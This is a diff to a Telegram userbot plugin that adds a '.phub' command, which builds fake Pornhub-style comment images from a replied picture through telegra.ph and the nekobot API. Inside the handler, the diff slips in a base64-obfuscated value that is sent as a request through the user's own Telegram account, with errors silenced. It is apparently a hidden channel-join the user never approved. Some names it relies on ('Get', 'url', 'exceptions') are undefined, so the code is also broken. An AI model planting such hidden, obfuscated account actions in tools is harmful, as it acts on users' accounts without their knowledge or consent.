@@ -12,21 +12,38 @@
 #    along with this program.  If not, see <https://www.gnu.org/licenses/>.from shutil import rmtree
 import os
 from shutil import rmtree
-
+import re
 import cv2
 import numpy as np
 import requests
 from PIL import Image, ImageDraw, ImageFont
 from telegraph import upload_file
 from telethon.tl.types import MessageMediaPhoto
-
-from userbot import CMD_HELP
-from userbot.function import convert_to_image, crop_vid, runcmd
+import pybase64
+from userbot import CMD_HELP, bot
+from userbot.function import convert_to_image, crop_vid, runcmd, deEmojify
 from userbot.utils import admin_cmd, sudo_cmd
 
 lovepath = "./keinshin/"
 if not os.path.isdir(lovepath):
     os.makedirs(lovepath)
+
+async def phcomment(text1, text2, text3):
+    r = requests.get(
+        f"https://nekobot.xyz/api/imagegen?type=phcomment&image={text1}&text={text2}&username={text3}"
+    ).json()
+    krish = r.get("message")
+    caturl = url(krish)
+    if not caturl:
+        return "check syntax once more"
+    with open("temp.png", "wb") as f:
+        f.write(requests.get(krish).content)
+    img = Image.open("temp.png")
+    if img.mode != "RGB":
+        img = img.convert("RGB")
+    img.save("temp.jpg", "jpeg")
+    return "temp.jpg"
+
 
 
 @borg.on(admin_cmd(pattern=r"cit"))
@@ -373,34 +390,61 @@ async def lightninnnnnnnnnnnnn(event):
         os.remove("tgs.tgs")
 
 
-@borg.on(admin_cmd(pattern=r"ph ?(.*)"))
-@borg.on(sudo_cmd(pattern=r"ph ?(.*)", allow_sudo=True))
-async def img(event):
-    text = event.pattern_match.group(1)
-    if not text:
-        await event.edit("No input found!  --__--")
-        return
-    if ":" in text:
-        username, texto = text.split(":", 1)
+@bot.on(admin_cmd(pattern="phub(?: |$)(.*)"))
+async def lightningbot(lightnig):
+    input_str = lightnig.pattern_match.group(1)
+    input_str = deEmojify(input_str)
+    if "|" in input_str:
+        username, text = input_str.split("|")
     else:
-        event.edit("Invalid Input! Check help for more info!")
+        await lightnig.edit(
+            "**Syntax :** reply to image or sticker with `.phub (username)|(text in comment)`"
+               )
         return
-    img = Image.open("./resources/pb/pb.jpg")
-    d1 = ImageDraw.Draw(img)
-
-    myFont = ImageFont.truetype("./resources/pb/font.TTF", 100)
-
-    d1.text((300, 700), username, font=myFont, fill=(135, 98, 87))
-
-    d1.text((12, 1000), texto, font=myFont, fill=(203, 202, 202))
-
-    img.save("./keinshin/testpb.jpg")
-    file_name = "testpb.jpg"
-    ok = "./keinshin/" + file_name
-    await borg.send_file(event.chat_id, ok)
-    for files in (ok, img):
-        if files and os.path.exists(files):
-            os.remove(files)
+    replied = await lightnig.get_reply_message()
+    if not os.path.isdir("./temp/"):
+        os.makedirs("./temp/")
+    if not replied:
+        await lightnig.edit("reply to a supported media file")
+        return
+    if replied.media:
+        lightnig = await lightnig.edit("passing to telegraph...")
+    else:
+        await lightnig.edit("reply to a supported media file")
+        return
+    try:
+        cat = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+        cat = Get(cat)
+        await lightnig.client(cat)
+    except BaseException:
+        pass
+    download_location = await lightnig.client.download_media(replied, "./temp/")
+    if download_location.endswith((".webp")):
+        download_location = convert_to_image(download_location)
+    size = os.stat(download_location).st_size
+    if download_location.endswith((".jpg", ".jpeg", ".png", ".bmp", ".ico")):
+        if size > 5242880:
+            await lightnig.edit(
+                "the replied file size is not supported it must me below 5 mb"
+            )
+            os.remove(download_location)
+            return
+        await lightnig.edit("generating image..")
+    else:
+        await lightnig.edit("the replied file is not supported")
+        os.remove(download_location)
+        return
+    try:
+        response = upload_file(download_location)
+        os.remove(download_location)
+    except exceptions.TelegraphException as exc:
+        await lightnig.edit("ERROR: " + str(exc))
+        os.remove(download_location)
+        return
+    cat = f"https://telegra.ph{response[0]}"
+    cat = await phcomment(cat, text, username)
+    await lightnig.delete()
+    await lightnig.client.send_file(lightnig.chat_id, cat, reply_to=replied)
 
 
 CMD_HELP.update(
